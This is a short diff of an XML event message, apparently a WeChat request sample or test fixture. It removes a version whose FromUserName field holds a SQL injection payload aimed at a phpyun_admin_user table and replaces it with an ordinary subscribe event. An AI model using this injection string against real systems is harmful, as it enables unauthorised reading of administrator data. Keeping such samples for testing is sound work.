@@ -1,6 +1,7 @@
-<xml>
-<MsgType>event</MsgType>
-    <Event>CLICK</Event>
-    <EventKey>我的帐号</EventKey>
-    <FromUserName>' union select 1,concat(0x23,md5(1122),0x23) from phpyun_admin_user limit 1#</FromUserName>
+<xml><ToUserName><![CDATA[gh_4248b691a8c6]]></ToUserName>
+<FromUserName><![CDATA[otilXuGet3hVCSNhQ1LbnX0YCaQ4]]></FromUserName>
+<CreateTime>1482374258</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[subscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
 </xml>
